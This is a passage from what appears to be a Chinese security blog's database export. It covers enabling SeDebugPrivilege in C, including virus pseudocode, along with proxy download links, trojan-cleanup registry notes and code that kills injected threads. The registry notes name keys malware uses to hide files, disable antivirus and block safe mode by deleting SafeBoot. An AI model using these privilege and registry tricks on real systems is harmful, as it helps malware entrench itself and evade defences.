ERROR_SUCCESS)\n    {\n        printf(&quot;修改特权不完全或失败!&quot; );\n    }\n    else\n    {\n        printf(&quot;修改成功!&quot; );\n    }\n}</code></pre>\n<p>下面给一个病毒使用的提升权限 IDA伪代码</p>\n<pre><code>int __cdecl reloadToken_4108F0(LPCWSTR lpName)\n{\n  HANDLE v2; // eax\n  struct _LUID Luid; // [esp+0h] [ebp-24h]\n  HANDLE TokenHandle; // [esp+8h] [ebp-1Ch]\n  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-18h]\n\n  if ( !LookupPrivilegeValueW(0, lpName, &amp;Luid) )// lpnmae SedebugPrivilege  查看拥有调试权限的令牌\n    return 0;\n  v2 = GetCurrentProcess();\n  if ( !OpenProcessToken(v2, 0x20028u, &amp;TokenHandle) )// 0x20028 = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY|READ_CONTROL\n    return 0;\n  NewState.Privileges[0].Luid = Luid;\n  NewState.PrivilegeCount = 1;\n  NewState.Privileges[0].Attributes = 2;\n  AdjustTokenPrivileges(TokenHandle, 0, &amp;NewState, 0, 0, 0);// 将访问令牌中禁用的权限启用，来达到权限提升\n  CloseHandle(TokenHandle);\n  return 1;\n}</code></pre><h3 id=\"普通用户组\"><a href=\"#普通用户组\" class=\"headerlink\" title=\"普通用户组\"></a>普通用户组</h3><p>普通用户组本身权限就比较少<br><img src=\"https://img-blog.csdnimg.cn/20190905175911142.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905183658642.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>Crat是普通用户组成员<br><img src=\"https://img-blog.csdnimg.cn/20190905191224944.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>普通用户一般是没有<code>SeDebugPrivilege</code> 权限的，也就是说这个用户组根本就没这个权限，不是能不能打开的问题，而是根本没有。</p>\n<p>所以普通用户不存在什么使用令牌的权限提升，即使有，都只是很小的一些权限。</p>\n<h4 id=\"查看进程权限\"><a href=\"#查看进程权限\" class=\"headerlink\" title=\"查看进程权限\"></a>查看进程权限</h4><p>程序能运行在<code>low</code> <code>medium</code> <code>hight</code> 三个level下,那怎么在通过代码检测自己拥有什么权限呢？</p>\n<p>通过<code>GetTokenInformation</code>拿到这个进程的<code>TokenInformation</code>信息 再通过比较<code>Label.Sid,</code>的值</p>\n<pre><code class=\"c\">void ShowProcessIntegrityLevel()\n{\n    HANDLE hToken;\n    HANDLE hProcess;\n\n    DWORD dwLengthNeeded;\n    DWORD dwError = ERROR_SUCCESS;\n\n    PTOKEN_MANDATORY_LABEL pTIL = NULL;\n    DWORD dwIntegrityLevel;\n\n    hProcess = GetCurrentProcess();\n    if (OpenProcessToken(hProcess, TOKEN_QUERY |\n        TOKEN_QUERY_SOURCE, &amp;hToken))\n    {\n        // Get the Integrity level.\n        if (!GetTokenInformation(hToken, TokenIntegrityLevel,\n            NULL, 0, &amp;dwLengthNeeded))\n        {\n            dwError = GetLastError();\n            if (dwError == ERROR_INSUFFICIENT_BUFFER)\n            {\n                pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,\n                    dwLengthNeeded);\n                if (pTIL != NULL)\n                {\n                    if (GetTokenInformation(hToken, TokenIntegrityLevel,\n                        pTIL, dwLengthNeeded, &amp;dwLengthNeeded))\n                    {\n                        dwIntegrityLevel = *GetSidSubAuthority(pTIL-&gt;Label.Sid,\n                            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL-&gt;Label.Sid) - 1));\n\n                        if (dwIntegrityLevel &lt; SECURITY_MANDATORY_MEDIUM_RID)\n                        {\n                            // Low Integrity\n                            wprintf(L&quot;Low Integrity Process&quot;);\n                        }\n                        else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp;\n                            dwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID)\n                        {\n                            // Medium Integrity\n                            wprintf(L&quot;Medium Integrity Process&quot;);\n                        }\n                        else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID)\n                        {\n                            // High Integrity\n                            wprintf(L&quot;High Integrity Process&quot;);\n                        }\n                    }\n                    LocalFree(pTIL);\n                }\n            }\n        }\n        CloseHandle(hToken);\n    }\n}</code></pre>\n<p>参考  <a href=\"https://www.cnblogs.chom/hqu-ye/articles/4838381.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.chom/hqu-ye/articles/4838381.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong><a href=\"https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83_(Windows)\" target=\"_blank\" rel=\"noopener\">什么是特权</a></strong></p>\n<p><strong>注意，这里说的提权不是从<code>Administrator</code>提升到 <code>System</code>,只是开启一些<code>Administrator</code>组的特殊权限</strong></p>\n<p><strong>查看用户组信息使用命令 <code>whoami /all</code></strong></p>\n<h3 id=\"Administrator组\"><a href=\"#Administrator组\" class=\"headerlink\" title=\"Administrator组\"></a>Administrator组</h3><p>管理员组一般权限比较多，但是很多都禁用了,我们这里需要的是<code>SeDebugPrivilege</code>，要是进程拥有了这个权限，就能对任意进程进行操作（包括<code>system</code>）</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905184130154.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905190534272.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<blockquote>\n<p>当用户试图执行一个特权操作，系统检查用户的访问令牌以确定使用是否具有必要的特权。调用GetTokenInformation函数可以检查特权。</p>\n</blockquote>\n<p>我要做的就是找到找到一个系统中有<code>SeDebugPrivilege</code>权限的令牌，然后复制下来，把自己的令牌改为他这个，然乎自己就拥有了<code>SeDebugPrivilege</code>权限了。这也就是提升权限的核心。</p>\n<p>下图是我使用 <code>OpenProcess</code>对SID为4的系统进程进行操作，且操作权限是<code>PROCESS_ALL_ACCESS</code></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905190019240.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>下面看看具体实现</p>\n<pre><code class=\"c\">void CgPivilige()\n{\n    BOOL retn;\n    HANDLE hToken;\n    retn = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | READ_CONTROL, &amp;hToken);//修改令牌特权值\n    if (retn != TRUE)\n    {\n        printf(&quot;获取令牌句柄失败!&quot; );\n        return;\n    }\n\n    TOKEN_PRIVILEGES tp; //新特权结构体\n    LUID Luid;\n    retn = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid);//查看具有调试权限的令牌\n\n    if (retn != TRUE)\n    {\n        printf(&quot;获取Luid失败&quot; );\n        return;\n    }\n    //给TP和TP里的LUID结构体赋值\n    tp.PrivilegeCount = 1;\n    tp.Privileges[0].Luid = Luid;\n    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n    AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);//调整自己Token为有调试特权的Token\n    if (GetLastError() != ERROR_SUCCESS)\n    {\n        printf(&quot;修改特权不完全或失败!&quot; );\n    }\n    else\n    {\n        printf(&quot;修改成功!&quot; );\n    }\n}</code></pre>\n<p>下面给一个病毒使用的提升权限 IDA伪代码</p>\n<pre><code>int __cdecl reloadToken_4108F0(LPCWSTR lpName)\n{\n  HANDLE v2; // eax\n  struct _LUID Luid; // [esp+0h] [ebp-24h]\n  HANDLE TokenHandle; // [esp+8h] [ebp-1Ch]\n  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-18h]\n\n  if ( !LookupPrivilegeValueW(0, lpName, &amp;Luid) )// lpnmae SedebugPrivilege  查看拥有调试权限的令牌\n    return 0;\n  v2 = GetCurrentProcess();\n  if ( !OpenProcessToken(v2, 0x20028u, &amp;TokenHandle) )// 0x20028 = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY|READ_CONTROL\n    return 0;\n  NewState.Privileges[0].Luid = Luid;\n  NewState.PrivilegeCount = 1;\n  NewState.Privileges[0].Attributes = 2;\n  AdjustTokenPrivileges(TokenHandle, 0, &amp;NewState, 0, 0, 0);// 将访问令牌中禁用的权限启用，来达到权限提升\n  CloseHandle(TokenHandle);\n  return 1;\n}</code></pre><h3 id=\"普通用户组\"><a href=\"#普通用户组\" class=\"headerlink\" title=\"普通用户组\"></a>普通用户组</h3><p>普通用户组本身权限就比较少<br><img src=\"https://img-blog.csdnimg.cn/20190905175911142.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905183658642.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>Crat是普通用户组成员<br><img src=\"https://img-blog.csdnimg.cn/20190905191224944.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>普通用户一般是没有<code>SeDebugPrivilege</code> 权限的，也就是说这个用户组根本就没这个权限，不是能不能打开的问题，而是根本没有。</p>\n<p>所以普通用户不存在什么使用令牌的权限提升，即使有，都只是很小的一些权限。</p>\n<h4 id=\"查看进程权限\"><a href=\"#查看进程权限\" class=\"headerlink\" title=\"查看进程权限\"></a>查看进程权限</h4><p>程序能运行在<code>low</code> <code>medium</code> <code>hight</code> 三个level下,那怎么在通过代码检测自己拥有什么权限呢？</p>\n<p>通过<code>GetTokenInformation</code>拿到这个进程的<code>TokenInformation</code>信息 再通过比较<code>Label.Sid,</code>的值</p>\n<pre><code class=\"c\">void ShowProcessIntegrityLevel()\n{\n    HANDLE hToken;\n    HANDLE hProcess;\n\n    DWORD dwLengthNeeded;\n    DWORD dwError = ERROR_SUCCESS;\n\n    PTOKEN_MANDATORY_LABEL pTIL = NULL;\n    DWORD dwIntegrityLevel;\n\n    hProcess = GetCurrentProcess();\n    if (OpenProcessToken(hProcess, TOKEN_QUERY |\n        TOKEN_QUERY_SOURCE, &amp;hToken))\n    {\n        // Get the Integrity level.\n        if (!GetTokenInformation(hToken, TokenIntegrityLevel,\n            NULL, 0, &amp;dwLengthNeeded))\n        {\n            dwError = GetLastError();\n            if (dwError == ERROR_INSUFFICIENT_BUFFER)\n            {\n                pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,\n                    dwLengthNeeded);\n                if (pTIL != NULL)\n                {\n                    if (GetTokenInformation(hToken, TokenIntegrityLevel,\n                        pTIL, dwLengthNeeded, &amp;dwLengthNeeded))\n                    {\n                        dwIntegrityLevel = *GetSidSubAuthority(pTIL-&gt;Label.Sid,\n                            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL-&gt;Label.Sid) - 1));\n\n                        if (dwIntegrityLevel &lt; SECURITY_MANDATORY_MEDIUM_RID)\n                        {\n                            // Low Integrity\n                            wprintf(L&quot;Low Integrity Process&quot;);\n                        }\n                        else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp;\n                            dwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID)\n                        {\n                            // Medium Integrity\n                            wprintf(L&quot;Medium Integrity Process&quot;);\n                        }\n                        else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID)\n                        {\n                            // High Integrity\n                            wprintf(L&quot;High Integrity Process&quot;);\n                        }\n                    }\n                    LocalFree(pTIL);\n                }\n            }\n        }\n        CloseHandle(hToken);\n    }\n}</code></pre>\n<p>参考  <a href=\"https://www.cnblogs.chom/hqu-ye/articles/4838381.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.chom/hqu-ye/articles/4838381.html</a></p>\n"},{"title":"PC及安卓翻墙","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121303.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121303.png","date":"2019-11-09T02:28:01.000Z","_content":"\n\n之前写过一篇，但是效果不太理想，现在再总结一下使用中的常见问题\n\n这是我随意打开的Youtube，连接速度达到了 1M/s  1080是没什么问题了\n\n\nPC端\n\n\n![20191216121217.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121217.png)\n\n手机端\n![20191216121241.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121241.png)\n\n各版本下载链接(这些在github上都是开源的，不放心可以自己去找源码编译)\n\nhttp://files.huaduo.icu/shadowsocksr/\n\n\n## PC安装与使用\n\n\n\n","source":"_posts/梯子.md","raw":"---\ntitle: PC及安卓翻墙\ntags: [防火墙, 代理]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121303.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121303.png\ndate: 2019-11-09 10:28:01\n---\n\n\n之前写过一篇，但是效果不太理想，现在再总结一下使用中的常见问题\n\n这是我随意打开的Youtube，连接速度达到了 1M/s  1080是没什么问题了\n\n\nPC端\n\n\n![20191216121217.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121217.png)\n\n手机端\n![20191216121241.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121241.png)\n\n各版本下载链接(这些在github上都是开源的，不放心可以自己去找源码编译)\n\nhttp://files.huaduo.icu/shadowsocksr/\n\n\n## PC安装与使用\n\n\n\n","slug":"梯子","published":1,"updated":"2019-12-16T04:13:23.624Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw636001vccuquagkvgbb","content":"<p>之前写过一篇，但是效果不太理想，现在再总结一下使用中的常见问题</p>\n<p>这是我随意打开的Youtube，连接速度达到了 1M/s  1080是没什么问题了</p>\n<p>PC端</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121217.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216121217.png\"></p>\n<p>手机端<br><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121241.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216121241.png\"></p>\n<p>各版本下载链接(这些在github上都是开源的，不放心可以自己去找源码编译)</p>\n<p><a href=\"http://files.huaduo.icu/shadowsocksr/\" target=\"_blank\" rel=\"noopener\">http://files.huaduo.icu/shadowsocksr/</a></p>\n<h2 id=\"PC安装与使用\"><a href=\"#PC安装与使用\" class=\"headerlink\" title=\"PC安装与使用\"></a>PC安装与使用</h2>","site":{"data":{}},"excerpt":"","more":"<p>之前写过一篇，但是效果不太理想，现在再总结一下使用中的常见问题</p>\n<p>这是我随意打开的Youtube，连接速度达到了 1M/s  1080是没什么问题了</p>\n<p>PC端</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121217.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216121217.png\"></p>\n<p>手机端<br><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121241.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216121241.png\"></p>\n<p>各版本下载链接(这些在github上都是开源的，不放心可以自己去找源码编译)</p>\n<p><a href=\"http://files.huaduo.icu/shadowsocksr/\" target=\"_blank\" rel=\"noopener\">http://files.huaduo.icu/shadowsocksr/</a></p>\n<h2 id=\"PC安装与使用\"><a href=\"#PC安装与使用\" class=\"headerlink\" title=\"PC安装与使用\"></a>PC安装与使用</h2>"},{"title":"Shellcode基础","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217105901.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217105901.png","date":"2019-11-03T11:11:22.000Z","_content":"\n\n\n## 注册表\n### 文件隐藏\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL]\nCheckedValue = 0 //此时无法通过文件夹选项设置成功\nCheckedValue = 1 //Windows默认值\n把CheckedValue修改成Windows默认值1后，系统恢复正常。\n\n[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden]\n这个对隐藏文件有用\n\n\n### 关闭杀软\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Feature]\n![20191216121113.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121113.png)\n\n\n\n\n### 网络相关\n[SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List]\n\n\n### safeBoot\n[HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\SafeBoot\"]\n[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SafeBoot\"]\n\n可递归删除，就不能进入安全模式\n\n","source":"_posts/现场木马清理建议.md","raw":"---\ntitle: Shellcode基础\ntags: [木马]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217105901.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217105901.png\ndate: 2019-11-03 19:11:22\n---\n\n\n\n## 注册表\n### 文件隐藏\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL]\nCheckedValue = 0 //此时无法通过文件夹选项设置成功\nCheckedValue = 1 //Windows默认值\n把CheckedValue修改成Windows默认值1后，系统恢复正常。\n\n[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden]\n这个对隐藏文件有用\n\n\n### 关闭杀软\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Feature]\n![20191216121113.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121113.png)\n\n\n\n\n### 网络相关\n[SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List]\n\n\n### safeBoot\n[HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\SafeBoot\"]\n[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SafeBoot\"]\n\n可递归删除，就不能进入安全模式\n\n","slug":"现场木马清理建议","published":1,"updated":"2020-03-02T02:35:00.775Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw636001yccuqa7wgb1zu","content":"<h2 id=\"注册表\"><a href=\"#注册表\" class=\"headerlink\" title=\"注册表\"></a>注册表</h2><h3 id=\"文件隐藏\"><a href=\"#文件隐藏\" class=\"headerlink\" title=\"文件隐藏\"></a>文件隐藏</h3><p>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL]<br>CheckedValue = 0 //此时无法通过文件夹选项设置成功<br>CheckedValue = 1 //Windows默认值<br>把CheckedValue修改成Windows默认值1后，系统恢复正常。</p>\n<p>[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden]<br>这个对隐藏文件有用</p>\n<h3 id=\"关闭杀软\"><a href=\"#关闭杀软\" class=\"headerlink\" title=\"关闭杀软\"></a>关闭杀软</h3><p>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Feature]<br><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121113.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216121113.png\"></p>\n<h3 id=\"网络相关\"><a href=\"#网络相关\" class=\"headerlink\" title=\"网络相关\"></a>网络相关</h3><p>[SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List]</p>\n<h3 id=\"safeBoot\"><a href=\"#safeBoot\" class=\"headerlink\" title=\"safeBoot\"></a>safeBoot</h3><p>[HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\SafeBoot”]<br>[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SafeBoot”]</p>\n<p>可递归删除，就不能进入安全模式</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"注册表\"><a href=\"#注册表\" class=\"headerlink\" title=\"注册表\"></a>注册表</h2><h3 id=\"文件隐藏\"><a href=\"#文件隐藏\" class=\"headerlink\" title=\"文件隐藏\"></a>文件隐藏</h3><p>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL]<br>CheckedValue = 0 //此时无法通过文件夹选项设置成功<br>CheckedValue = 1 //Windows默认值<br>把CheckedValue修改成Windows默认值1后，系统恢复正常。</p>\n<p>[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden]<br>这个对隐藏文件有用</p>\n<h3 id=\"关闭杀软\"><a href=\"#关闭杀软\" class=\"headerlink\" title=\"关闭杀软\"></a>关闭杀软</h3><p>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Feature]<br><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121113.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216121113.png\"></p>\n<h3 id=\"网络相关\"><a href=\"#网络相关\" class=\"headerlink\" title=\"网络相关\"></a>网络相关</h3><p>[SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List]</p>\n<h3 id=\"safeBoot\"><a href=\"#safeBoot\" class=\"headerlink\" title=\"safeBoot\"></a>safeBoot</h3><p>[HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\SafeBoot”]<br>[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SafeBoot”]</p>\n<p>可递归删除，就不能进入安全模式</p>\n"},{"title":"恶意线程清理","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121437.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121437.png","date":"2019-11-07T13:28:01.000Z","_content":"\n这篇博客的背景是：如果很多进程都恶意程序通过远进程注入了线程，那么应该怎么清除呢？\n\n下面给出两种方法\n\n## PLAN A\n来自 加号\n\n通过遍历线程后，根据获取到的线程信息，对线程地址和入口代码进行检查，这种方式适合对注入代码偏移位置固定或则入口代码固定，能准确查杀，推荐使用\n\n```C\nvoid Killing::KillMalRemoteThread()\n{\n\t(FARPROC&)ZwQueryInformationThread = GetProcAddress(m_hNtdll, \"ZwQueryInformationThread\");\n\n\tHANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n\tTHREADENTRY32 te32;\n\n\tte32.dwSize = sizeof(THREADENTRY32);\n\tThread32First(hThreadSnap, &te32);\n\tHANDLE hThread;\n\tdo {\n\t\thThread = OpenThread(THREAD_ALL_ACCESS, false, te32.th32ThreadID);\n\n\t\tsetlocale(LC_ALL, \".ACP\");\n\n\t\tDWORD startAddr;\n\t\tZwQueryInformationThread(hThread, ThreadQuerySetWin32StartAddress, &startAddr, sizeof(PVOID), NULL);\n\n\t\tprintf(\"进程 %d, 线程 %d, 入口地址 0x%x\\n\", te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);\n\n\t\tif (startAddr > 0x400000 && startAddr < 0x80000000)\n\t\t{\n\t\t\tif ((startAddr & 0xFFFF) == 0x3A72 || (startAddr & 0xFFFF) == 0x36F4)//判断进程入口地址2字节\n\t\t\t{\n\t\t\t\tPBYTE pbMapBase = (PBYTE)((startAddr & 0xFFFF) == 0x3A72 ? startAddr - 0x3A72 : startAddr - 0x36F4);\n\t\t\t\tHANDLE hOwnerProc = OpenProcess(PROCESS_VM_READ, false, te32.th32OwnerProcessID);\n\n\t\t\t\tBYTE sectionOff_0[4] = { 0 };\n\t\t\t\tBYTE sectionOff_2F8[5] = { 0 };\n\t\t\t\tReadProcessMemory(hOwnerProc, pbMapBase, sectionOff_0, 4, NULL);\n\t\t\t\tReadProcessMemory(hOwnerProc, pbMapBase + 0x2F8, sectionOff_2F8, 5, NULL);\n\n\t\t\t\tif (*(DWORD*)& sectionOff_0 == 0xFF243C83 &&\n\t\t\t\t\t*(DWORD*)& sectionOff_2F8 == 0x00012DE9 &&\n\t\t\t\t\tsectionOff_2F8[4] == 0x00)//进一步检查入口代码是否为特定值\n\t\t\t\t{\n\t\t\t\t\tprintf(\"########\\n恶意线程，在进程 %d, 线程 %d, 入口地址 0x%x\\n\", te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);\n\t\t\t\t\tif (TerminateThread(hThread, -1))\n\t\t\t\t\t{\n\t\t\t\t\t\tprintf(\"已终止该线程\\n\");\n\t\t\t\t\t}\n\t\t\t\t\tprintf(\"########\\n\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tCloseHandle(hThread);\n\n\t} while (Thread32Next(hThreadSnap, &te32));\n\n\tCloseHandle(hThreadSnap);\n}\n\n```\n\n## PLAN B\n\n而这个方案就比较猛一些，可以直接干掉所有不在模块中的线程，要小心一点\n\n因为普通线程创建都会在进程的已知模块中，而恶意代码创建的就是不属于任何模块，也可以用过指定模块名来关闭线程\n\n```C\nvoid WINAPI ClearThread()\n{\n\tint Flag = 3;\n\n\twhile (Flag)\n\t{\n\t\tSleep(1000);\n\t\tHANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\t// 进程快照句柄\n\t\tPROCESSENTRY32 process = { sizeof(PROCESSENTRY32) };\t\t\t\t\t\t// 进程快照信息\n\n\t\t// 遍历进程\n\t\twhile (Process32Next(hProcessSnap, &process))\n\t\tth32ProcessID{\n\t\t\tHANDLE hThreadSnap = INVALID_HANDLE_VALUE;\t\t\t// 线程快照句柄 \n\t\t\tTHREADENTRY32 te32;\t\t\t\t\t\t\t\t\t// 线程快照信息\n\t\t\t// 创建线程快照\n\t\t\thThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n\t\t\tif (hThreadSnap == INVALID_HANDLE_VALUE) { printf(\"创建线程快照失败\"); }\n\n\t\t\t// 为快照分派内存空间\n\t\t\tte32.dwSize = sizeof(THREADENTRY32);\n\n\t\t\t// 获取第一个线程的信息\n\t\t\tif (!Thread32First(hThreadSnap, &te32)) { printf(\"线程信息获取失败\"); }\n\n\t\t\t// 遍历线程\n\t\t\twhile (Thread32Next(hThreadSnap, &te32))\n\t\t\t{\n\t\t\t\tif (te32.th32OwnerProcessID == process.th32ProcessID)\n\t\t\t\t{\n\t\t\t\t\t// 打开线程\n\t\t\t\t\t//printf(\"PID=%d, TID=%d\\n\",te32.th32OwnerProcessID,te32.th32ThreadID);\n\n\t\t\t\t\tHANDLE hThread = ::OpenThread(\n\t\t\t\t\t\tTHREAD_ALL_ACCESS,\t\t// 访问权限，THREAD_ALL_ACCESS ：所有权限\n\t\t\t\t\t\tFALSE,\t\t\t\t\t// 由此线程创建的进程不继承线程的句柄\n\t\t\t\t\t\tte32.th32ThreadID\t\t// 线程 ID\n\t\t\t\t\t\t);\n\t\t\t\t\tif (hThread == NULL) \n\t\t\t\t\t{ \n\t\t\t\t\t\t//printf(\"线程打开失败%x\\n\", GetLastError()); \n\t\t\t\t\t\tcontinue; \n\t\t\t\t\t}\n\n\t\t\t\t\t// 将区域设置设置为从操作系统获取的ANSI代码页\n\t\t\t\t\tsetlocale(LC_ALL, \".ACP\");\n\n\t\t\t\t\t// 获取 ntdll.dll 的模块句柄\n\t\t\t\t\tHINSTANCE hNTDLL = ::GetModuleHandleA(\"ntdll\");\n\n\t\t\t\t\t// 从 ntdll.dll 中取出 ZwQueryInformationThread\n\t\t\t\t\t(FARPROC&)ZwQueryInformationThread = ::GetProcAddress(hNTDLL, \"ZwQueryInformationThread\");\n\n\t\t\t\t\t// 获取线程入口地址\n\t\t\t\t\tPVOID startaddr;\t\t\t\t\t\t// 用来接收线程入口地址\n\t\t\t\t\tZwQueryInformationThread(\n\t\t\t\t\t\thThread,\t\t\t\t\t\t\t// 线程句柄\n\t\t\t\t\t\tThreadQuerySetWin32StartAddress,\t// 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址\n\t\t\t\t\t\t&startaddr,\t\t\t\t\t\t\t// 指向缓冲区的指针\n\t\t\t\t\t\tsizeof(startaddr),\t\t\t\t\t// 缓冲区的大小\n\t\t\t\t\t\tNULL\n\t\t\t\t\t\t);\n\n\t\t\t\t\t// 获取线程所在模块\n\t\t\t\t\tTHREAD_BASIC_INFORMATION tbi;\t\t\t// _THREAD_BASIC_INFORMATION 结构体对象\n\t\t\t\t\tTCHAR modname[MAX_PATH];\t\t\t\t// 用来接收模块全路径\n\t\t\t\t\tZwQueryInformationThread(\n\t\t\t\t\t\thThread,\t\t\t\t\t\t\t// 线程句柄\n\t\t\t\t\t\tThreadBasicInformation,\t\t\t\t// 线程信息类型，ThreadBasicInformation ：线程基本信息\n\t\t\t\t\t\t&tbi,\t\t\t\t\t\t\t\t// 指向缓冲区的指针\n\t\t\t\t\t\tsizeof(tbi),\t\t\t\t\t\t// 缓冲区的大小\n\t\t\t\t\t\tNULL\n\t\t\t\t\t\t);\n\n\t\t\t\t\t// 